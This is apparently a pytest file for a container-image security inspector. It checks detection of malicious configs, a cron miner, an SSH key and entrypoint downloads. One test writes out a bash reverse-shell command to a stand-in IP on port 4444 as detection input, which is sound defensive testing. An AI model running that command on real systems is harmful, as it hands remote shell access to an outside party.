import copy
import json
from pathlib import Path

from aisec_lab import load_lab_module

ins = load_lab_module(__file__, "inspector")
FIX = Path(__file__).parent / "fixtures"
BAD = json.loads((FIX / "config_malicious.json").read_text())
GOOD = json.loads((FIX / "config_clean.json").read_text())
LAYERS = json.loads((FIX / "layers_malicious.json").read_text())["files"]


def ids(findings):
    return {f.rule_id for f in findings}


def test_clean_image_is_allowed():
    assert ins.inspect_config(GOOD) == [] and ins.verdict([]) == "ALLOW"


def test_malicious_config_findings():
    got = ids(ins.inspect_config(BAD))
    assert {"IMG-001", "IMG-003", "IMG-004", "IMG-005", "IMG-006", "IMG-008", "IMG-009", "IMG-010"} <= got
    assert ins.verdict(ins.inspect_config(BAD)) == "BLOCK"


def test_layer_files_find_cron_miner_and_ssh_key():
    got = ids(ins.inspect_files(LAYERS))
    assert {"FS-001", "FS-002", "FS-003", "FS-004"} <= got


def test_removing_the_entrypoint_download_removes_the_critical_finding():
    cfg = copy.deepcopy(BAD)
    cfg["config"]["Entrypoint"] = ["/usr/local/bin/server"]
    assert "IMG-001" not in ids(ins.inspect_config(cfg)) and "IMG-003" not in ids(ins.inspect_config(cfg))


def test_trusted_host_is_not_flagged():
    cfg = copy.deepcopy(GOOD)
    cfg["config"]["Entrypoint"] = ["/bin/sh", "-c", "wget https://pkgs.trusted.example/x -O /tmp/x"]
    assert "IMG-003" not in ids(ins.inspect_config(cfg))


def test_reverse_shell_pattern():
    cfg = copy.deepcopy(GOOD)
    cfg["config"]["Cmd"] = ["bash", "-c", "exec 3<>/dev/tcp/203.0.113.9/4444"]
    assert "IMG-002" in ids(ins.inspect_config(cfg))


def test_inspector_never_executes_anything():
    # The fixtures contain only strings; the module has no subprocess or exec import.
    source = (Path(__file__).parent / "inspector.py").read_text()
    assert "subprocess" not in source and "os.system" not in source
